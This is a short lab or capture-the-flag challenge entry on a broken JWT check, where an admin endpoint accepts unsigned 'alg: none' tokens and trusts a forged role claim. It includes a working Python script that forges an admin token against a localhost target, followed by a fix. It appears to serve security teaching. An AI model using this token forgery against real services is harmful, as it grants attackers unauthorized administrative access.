# 03 — Broken auth: alg=none / forged role

**Category:** Authorization · **MASVS-AUTH-2** · **Difficulty:** medium

## The flaw
`GET /api/admin` reads a JWT from the `Authorization: Bearer` header and trusts
the `role` claim **without verifying the signature**, and it honors tokens with
`"alg": "none"`. An attacker forges a token with any claims they like.

## Exploit
```python
import base64, json, urllib.request
b = lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip("=")
tok = f"{b({'alg':'none','typ':'JWT'})}.{b({'sub':'attacker','role':'admin'})}."
req = urllib.request.Request("http://127.0.0.1:8000/api/admin",
                             headers={"Authorization": f"Bearer {tok}"})
print(urllib.request.urlopen(req).read())   # flag in "secret"
```

## Fix
Reject `alg=none`. Verify the signature with a server-held key (HS256 secret or
RS256 public key) before reading any claim. Pin the expected algorithm — never
let the token's own header choose it.
